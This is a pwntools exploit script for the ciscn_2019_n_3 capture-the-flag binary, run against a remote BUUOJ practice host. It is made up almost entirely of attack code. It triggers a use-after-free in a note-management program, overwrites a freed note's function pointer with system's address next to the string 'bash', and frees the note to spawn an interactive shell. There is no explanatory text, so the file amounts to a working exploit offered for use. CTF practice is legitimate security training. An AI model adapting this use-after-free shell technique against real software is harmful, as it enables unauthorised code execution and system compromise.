#! /usr/bin/python


from pwn import *
from LibcSearcher import *

p = remote('node3.buuoj.cn',27182)
#p = process('./ciscn_2019_n_3')
elf = ELF('./ciscn_2019_n_3')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
context.log_level = 'debug'

def menu(choice):
	p.recvuntil('> ')
	p.sendline(str(choice))
'''
def add(idx,type,value,length=0):
	p.recvuntil("CNote > ")
	p.sendline(str(1))
	p.recvuntil("Index > ")
	p.sendline(str(idx))
	p.recvuntil("Type > ")
	p.sendline(str(type))
	if type == 1:
		p.recvuntil("Value > ")
        	p.sendline(str(value))
	else:
		p.recvuntil("Length > ")
		p.sendline(str(length))
		p.recvuntil("Value > ")
		if length == 8:
			p.send(value)
		else:
			p.sendline(value)
'''

def add(idx,value,length=0):
	p.recvuntil("CNote > ")
	p.sendline(str(1))
	p.recvuntil("Index > ")
	p.sendline(str(idx))
	p.recvuntil("Type > ")
	p.sendline('2')
	p.recvuntil("Length > ")
	p.sendline(str(length))
	p.recvuntil("Value > ")
	p.sendline(value)

def delete(idx):
	menu(2)
	p.recvuntil('> ')
	p.sendline(str(idx))

def dump(idx):
	menu(3)
	p.recvuntil('> ')
	p.sendline(str(idx))

system = elf.symbols['system']

###UAF###
add(0,'bbbb',0x38)
add(1,'cccc',0x38)

delete(0)
delete(1)

add(2,'bash'+p32(system),0xc)
###get shell###
delete(0)
p.interactive()
